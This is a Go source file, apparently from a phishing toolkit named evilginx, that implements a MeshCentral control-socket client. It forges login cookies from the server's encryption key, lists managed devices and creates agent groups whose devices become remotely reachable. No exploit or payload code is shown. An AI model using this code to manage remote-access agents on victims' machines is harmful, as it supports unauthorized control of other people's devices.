package evilginx

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// BridgeOptions configures a control.ashx WebSocket bridge session.
//
// The bridge authenticates the same way MeshCentral's own meshctrl.js tool
// does: it encodes an AES-256-GCM "auth=" cookie using the server's
// LoginCookieEncryptionKey. That key is either the value of
// settings.logincookieencryptionkey in the server config.json (our generated
// embedded server config) or the LoginCookieEncryptionKey database record for
// externally deployed servers.
type BridgeOptions struct {
	// ServerURL is the MeshCentral base URL, e.g. "https://mesh.example.com"
	// or "https://127.0.0.1:8443".
	ServerURL string
	// LoginKeyHex is the 80-byte (160 hex chars) LoginCookieEncryptionKey.
	LoginKeyHex string
	// UserID is the full MeshCentral user id, e.g. "user//admin" for the
	// default domain or "user/example.com/admin" for a named domain.
	UserID string
	// Timeout bounds each synchronous control request. Defaults to 30s.
	Timeout time.Duration
	// InsecureTLS skips server certificate verification. Intended for
	// embedded/local deployments that carry self-signed certificates.
	InsecureTLS bool
}

// Device is a condensed view of a MeshCentral agent node.
type Device struct {
	ID           string `json:"id"`
	Name         string `json:"name"`
	Hostname     string `json:"hostname,omitempty"`
	OS           string `json:"os,omitempty"`
	IP           string `json:"ip,omitempty"`
	MeshId       string `json:"meshid,omitempty"`
	Connectivity int    `json:"connectivity"`
	PowerState   int    `json:"power_state"`
	LastConnect  int64  `json:"last_connect"`
	Online       bool   `json:"online"`
}

// DeviceGroup is a MeshCentral device group (mesh).
type DeviceGroup struct {
	MeshId  string `json:"meshid"`
	Domain  string `json:"domain,omitempty"`
	Name    string `json:"name"`
	Desc    string `json:"desc,omitempty"`
	Type    int    `json:"type"`
	Devices int    `json:"devices"`
}

const (
	defaultBridgeTimeout = 30 * time.Second
	controlPath          = "/control.ashx"
)

// MeshBridge is a synchronous client for the MeshCentral control WebSocket.
//
// Concurrency: Write must not race with the read loop; every call sends while
// holding writeMu. Responses with a matching responseid are delivered to the
// caller's channel. Messages without a responseid (pushed events, and the
// getDeviceDetails reply which the server sends without echo) are matched
// against action-only waiters.
type MeshBridge struct {
	opts BridgeOptions

	mu     sync.Mutex
	ws     *websocket.Conn
	closed bool

	writeMu sync.Mutex

	pendMu  sync.Mutex
	pend    map[string]chan wsReply
	pendAct map[string][]chan wsReply

	seq uint64

	closeOnce sync.Once
}

type wsReply struct {
	data   []byte
	action string
	err    error
}

// New validates options and returns a bridge. The connection is established
// lazily on the first use or by calling Connect.
func New(o BridgeOptions) (*MeshBridge, error) {
	if o.ServerURL == "" {
		return nil, fmt.Errorf("evilginx: server_url is required")
	}
	u, err := url.Parse(o.ServerURL)
	if err != nil {
		return nil, fmt.Errorf("evilginx: invalid server_url: %w", err)
	}
	if u.Scheme != "https" && u.Scheme != "http" {
		return nil, fmt.Errorf("evilginx: server_url must be http(s), got %q", u.Scheme)
	}
	if _, err := loginKeyFromHex(o.LoginKeyHex); err != nil {
		return nil, err
	}
	if o.UserID == "" {
		return nil, fmt.Errorf("evilginx: user_id is required")
	}
	if o.Timeout <= 0 {
		o.Timeout = defaultBridgeTimeout
	}
	return &MeshBridge{opts: o, pend: make(map[string]chan wsReply), pendAct: make(map[string][]chan wsReply)}, nil
}

// Connect dials the control socket with an authenticated auth= cookie.
// Dial is skipped when an active connection is already present.
func (b *MeshBridge) Connect() error {
	b.mu.Lock()
	if b.ws != nil && !b.closed {
		b.mu.Unlock()
		return nil
	}
	b.mu.Unlock()

	key, err := loginKeyFromHex(b.opts.LoginKeyHex)
	if err != nil {
		return err
	}
	domainID := ""
	userID := b.opts.UserID
	if parts := strings.Split(userID, "/"); len(parts) == 3 && parts[0] == "user" {
		domainID = parts[1]
	}
	cookie, err := encodeAuthCookie(userID, domainID, key, time.Now())
	if err != nil {
		return err
	}

	u, err := url.Parse(b.opts.ServerURL)
	if err != nil {
		return err
	}
	u.Scheme = strings.ReplaceAll(u.Scheme, "https", "wss")
	u.Scheme = strings.ReplaceAll(u.Scheme, "http", "ws")
	u.Path = controlPath
	q := u.Query()
	q.Set("auth", cookie)
	u.RawQuery = q.Encode()

	dialer := websocket.Dialer{
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: b.opts.InsecureTLS},
		HandshakeTimeout: b.opts.Timeout,
	}
	conn, resp, err := dialer.Dial(u.String(), http.Header{})
	if err != nil {
		if resp != nil {
			return fmt.Errorf("evilginx: control dial returned %s: %w", resp.Status, err)
		}
		return fmt.Errorf("evilginx: control dial: %w", err)
	}

	b.mu.Lock()
	b.ws = conn
	b.closed = false
	b.closeOnce = sync.Once{}
	b.mu.Unlock()

	go b.readLoop(conn)
	return nil
}

// Close closes the socket and fails all in-flight requests.
func (b *MeshBridge) Close() {
	b.closeWithErr(fmt.Errorf("evilginx: bridge closed"))
}

// closeWithErr closes the socket and fails all in-flight requests with the
// given cause, so callers see why the socket died (read failure, remote
// close, auth reject) instead of a bare "bridge closed".
func (b *MeshBridge) closeWithErr(cause error) {
	b.mu.Lock()
	conn := b.ws
	if conn != nil {
		b.ws = nil
	}
	b.closed = true
	b.mu.Unlock()
	if conn != nil {
		_ = conn.Close()
	}
	b.failPending(cause)
}

func (b *MeshBridge) failPending(err error) {
	b.pendMu.Lock()
	defer b.pendMu.Unlock()
	for id, ch := range b.pend {
		delete(b.pend, id)
		ch <- wsReply{err: err}
	}
	for act, chans := range b.pendAct {
		delete(b.pendAct, act)
		for _, ch := range chans {
			ch <- wsReply{err: err}
		}
	}
}

// ServerVersion reports the MeshCentral server version via the
// 'serverversion' command (tags array carries the version tag).
func (b *MeshBridge) ServerVersion() (string, error) {
	data, err := b.call("serverversion", nil)
	if err != nil {
		return "", err
	}
	var msg struct {
		Result string `json:"result"`
		Tags   []struct {
			Tag   string `json:"tag"`
			Value string `json:"value"`
		} `json:"tags"`
	}
	if json.Unmarshal(data, &msg) != nil {
		return "", fmt.Errorf("evilginx: parse serverversion reply")
	}
	if msg.Result != "" && msg.Result != "OK" {
		return "", fmt.Errorf("evilginx: serverversion: %s", msg.Result)
	}
	for _, t := range msg.Tags {
		if t.Tag == "version" && t.Value != "" {
			return t.Value, nil
		}
	}
	return "", nil
}

// CreateMesh creates an Agent device group (meshtype 2) and returns its meshid.
// The mesh is owned by the authenticated user with full rights, so any agent
// installed into it is reachable by the platform admin.
func (b *MeshBridge) CreateMesh(name, desc string) (string, error) {
	if strings.TrimSpace(name) == "" {
		return "", fmt.Errorf("evilginx: create mesh requires a name")
	}
	extra := map[string]interface{}{
		"meshname": name,
		"meshtype": 2, // Agent device group
	}
	if desc != "" {
		extra["desc"] = desc
	}
	data, err := b.call("createmesh", extra)
	if err != nil {
		return "", err
	}
	var msg struct {
		Result string `json:"result"`
		MeshId string `json:"meshid"`
	}
	if json.Unmarshal(data, &msg) != nil {
		return "", fmt.Errorf("evilginx: parse createmesh reply")
	}
	if msg.Result != "ok" {
		return "", fmt.Errorf("evilginx: createmesh: %s", msg.Result)
	}
	if msg.MeshId == "" {
		return "", fmt.Errorf("evilginx: createmesh returned no meshid")
	}
	return msg.MeshId, nil
}

// ListMeshes returns all device groups visible to the authenticated user.
func (b *MeshBridge) ListMeshes() ([]DeviceGroup, error) {
	data, err := b.call("meshes", nil)
	if err != nil {
		return nil, err
	}
	var msg struct {
		Meshes []struct {
			ID      string `json:"_id"`
			Domain  string `json:"domain"`
			Name    string `json:"name"`
			Desc    string `json:"desc"`
			MType   int    `json:"mtype"`
			Devices int    `json:"devices"`
		} `json:"meshes"`
	}
	if json.Unmarshal(data, &msg) != nil {
		return nil, fmt.Errorf("evilginx: parse meshes reply")
	}
	groups := make([]DeviceGroup, 0, len(msg.Meshes))
	for _, m := range msg.Meshes {
		groups = append(groups, DeviceGroup{
			MeshId:  m.ID,
			Domain:  m.Domain,
			Name:    m.Name,
			Desc:    m.Desc,
			Type:    m.MType,
			Devices: m.Devices,
		})
	}
	return groups, nil
}

// ListDevices returns the agent nodes visible to the authenticated user.
func (b *MeshBridge) ListDevices() ([]Device, error) {
	data, err := b.call("getDeviceDetails", map[string]interface{}{"type": "json"})
	if err != nil {
		return nil, err
	}
	return parseDeviceDetails(data)
}

// call sends a control message and waits for the correlated reply.
func (b *MeshBridge) call(action string, extra map[string]interface{}) ([]byte, error) {
	if err := b.Connect(); err != nil {
		return nil, err
	}

	b.pendMu.Lock()
	b.seq++
	rid := "xavier-" + strconv.FormatUint(b.seq, 10)
	ch := make(chan wsReply, 1)
	b.pend[rid] = ch
	// getDeviceDetails is the one command MeshCentral replies to without
	// echoing a responseid; also register an action key so the reply is
	// delivered. Other commands confirm via responseid.
	if action == "getDeviceDetails" {
		b.pendAct[action] = append(b.pendAct[action], ch)
	}
	b.pendMu.Unlock()

	msg := map[string]interface{}{"action": action, "responseid": rid}
	for k, v := range extra {
		msg[k] = v
	}
	payload, err := json.Marshal(msg)
	if err != nil {
		b.dropPending(rid, action, ch)
		return nil, err
	}

	b.writeMu.Lock()
	b.mu.Lock()
	conn := b.ws
	b.mu.Unlock()
	if conn == nil {
		b.writeMu.Unlock()
		b.dropPending(rid, action, ch)
		return nil, fmt.Errorf("evilginx: control socket is closed")
	}
	if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
		b.writeMu.Unlock()
		b.dropPending(rid, action, ch)
		return nil, fmt.Errorf("evilginx: write %s: %w", action, err)
	}
	b.writeMu.Unlock()

	select {
	case reply := <-ch:
		if reply.err != nil {
			return nil, fmt.Errorf("evilginx: %s: %w", action, reply.err)
		}
		if reply.data == nil {
			return nil, fmt.Errorf("evilginx: %s: bridge closed", action)
		}
		return reply.data, nil
	case <-time.After(b.opts.Timeout):
		b.dropPending(rid, action, ch)
		return nil, fmt.Errorf("evilginx: %s: reply timeout after %s", action, b.opts.Timeout)
	}
}

func (b *MeshBridge) dropPending(rid string, action string, ch chan wsReply) {
	b.pendMu.Lock()
	defer b.pendMu.Unlock()
	delete(b.pend, rid)
	chans := b.pendAct[action]
	for i, c := range chans {
		if c == ch {
			b.pendAct[action] = append(chans[:i], chans[i+1:]...)
			break
		}
	}
	if len(b.pendAct[action]) == 0 {
		delete(b.pendAct, action)
	}
}

// readLoop drains the socket, routing replies to pending requests. It always
// defers a recover guard per project convention.
func (b *MeshBridge) readLoop(conn *websocket.Conn) {
	defer func() {
		if r := recover(); r != nil {
			_ = r
		}
	}()
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			b.closeWithErr(fmt.Errorf("evilginx: bridge closed: %w", err))
			return
		}
		var probe struct {
			ResponseID string `json:"responseid"`
			Action     string `json:"action"`
		}
		if json.Unmarshal(data, &probe) != nil {
			continue
		}
		reply := wsReply{data: data, action: probe.Action}
		if probe.ResponseID == "" && probe.Action == "close" {
			// Server-initiated disconnect (auth reject, bad origin, …).
			// MeshCentral sends {action:'close',cause,msg} before dropping
			// the socket; surface the cause so callers see e.g. "noauth"
			// instead of a bare websocket close code.
			var cause struct {
				Cause string `json:"cause"`
				Msg   string `json:"msg"`
			}
			_ = json.Unmarshal(data, &cause)
			b.closeWithErr(fmt.Errorf("evilginx: server closed control session: cause=%s msg=%s", cause.Cause, cause.Msg))
			return
		}
		b.pendMu.Lock()
		if probe.ResponseID != "" {
			if ch, ok := b.pend[probe.ResponseID]; ok {
				delete(b.pend, probe.ResponseID)
				ch <- reply
			}
		} else if probe.Action != "" {
			if chans := b.pendAct[probe.Action]; len(chans) > 0 {
				ch := chans[0]
				b.pendAct[probe.Action] = chans[1:]
				if len(b.pendAct[probe.Action]) == 0 {
					delete(b.pendAct, probe.Action)
				}
				ch <- reply
			}
		}
		b.pendMu.Unlock()
	}
}

// parseDeviceDetails extracts condensed Device views from the getDeviceDetails
// reply. The server replies with { action, data: [...] } where each entry is a
// full device record keyed by a 'node' object plus optional sys/net data.
func parseDeviceDetails(data []byte) ([]Device, error) {
	aux := struct {
		Data json.RawMessage `json:"data"`
	}{}
	if json.Unmarshal(data, &aux) == nil && len(aux.Data) > 0 {
		return parseDeviceArray(aux.Data)
	}
	// Fall back to a bare array payload.
	return parseDeviceArray(data)
}

// describeUnparsedReply renders enough of a reply that failed to parse to tell what
// shape it actually was, without dumping a whole device list into an error string.
//
// The parse error used to be a fixed string, so a reply in an unexpected shape was
// indistinguishable from an empty one: the device grid answered 502, Cloudflare
// replaced the body with its own page, and the journal said only "parse
// getDeviceDetails reply". Nothing said what arrived. A length and a key list is
// enough to tell "a different envelope" from "an array of something else" without
// putting device details in a log line.
func describeUnparsedReply(raw []byte) string {
	const maxKeys = 24
	var top map[string]json.RawMessage
	keys := []string{}
	if json.Unmarshal(raw, &top) == nil {
		for k := range top {
			if len(keys) < maxKeys {
				keys = append(keys, k)
			}
		}
		sort.Strings(keys)
		return fmt.Sprintf("%d bytes, top-level object keys: %v", len(raw), keys)
	}
	var arr []json.RawMessage
	if json.Unmarshal(raw, &arr) == nil {
		elem := "an empty array"
		if len(arr) > 0 {
			var fields map[string]json.RawMessage
			if json.Unmarshal(arr[0], &fields) == nil {
				fk := []string{}
				for k := range fields {
					if len(fk) < maxKeys {
						fk = append(fk, k)
					}
				}
				sort.Strings(fk)
				elem = fmt.Sprintf("%d entries, first has keys %v", len(arr), fk)
			} else {
				elem = fmt.Sprintf("%d entries, first is not an object", len(arr))
			}
		}
		return fmt.Sprintf("%d bytes, array: %s", len(raw), elem)
	}
	head := string(raw)
	if len(head) > 160 {
		head = head[:160] + "..."
	}
	return fmt.Sprintf("%d bytes, neither object nor array: %q", len(raw), head)
}

func parseDeviceArray(raw json.RawMessage) ([]Device, error) {
	var entries []struct {
		Node struct {
			ID     string `json:"_id"`
			Name   string `json:"name"`
			Host   string `json:"host"`
			OSDesc string `json:"osdesc"`
			IP     string `json:"ip"`
			MeshId string `json:"meshid"`
			Conn   int    `json:"conn"`
			Pwr    int    `json:"pwr"`
		} `json:"node"`
		LastConnect struct {
			ConnectTime int64 `json:"connecttime"`
		} `json:"lastConnect"`
	}
	if json.Unmarshal(raw, &entries) != nil {
		// Try a single bare node object.
		var one struct {
			ID     string `json:"_id"`
			Name   string `json:"name"`
			Host   string `json:"host"`
			OSDesc string `json:"osdesc"`
			IP     string `json:"ip"`
			MeshId string `json:"meshid"`
		}
		if json.Unmarshal(raw, &one) == nil && one.ID != "" {
			return []Device{{
				ID: one.ID, Name: one.Name, Hostname: one.Host,
				OS: one.OSDesc, IP: one.IP, MeshId: one.MeshId,
			}}, nil
		}
		return nil, fmt.Errorf("evilginx: parse getDeviceDetails reply: %s",
			describeUnparsedReply(raw))
	}
	devices := make([]Device, 0, len(entries))
	for _, e := range entries {
		dev := Device{
			ID:           e.Node.ID,
			Name:         e.Node.Name,
			Hostname:     e.Node.Host,
			OS:           e.Node.OSDesc,
			IP:           e.Node.IP,
			MeshId:       e.Node.MeshId,
			Connectivity: e.Node.Conn,
			PowerState:   e.Node.Pwr,
			LastConnect:  e.LastConnect.ConnectTime,
			Online:       (e.Node.Conn & 1) != 0,
		}
		devices = append(devices, dev)
	}
	return devices, nil
}
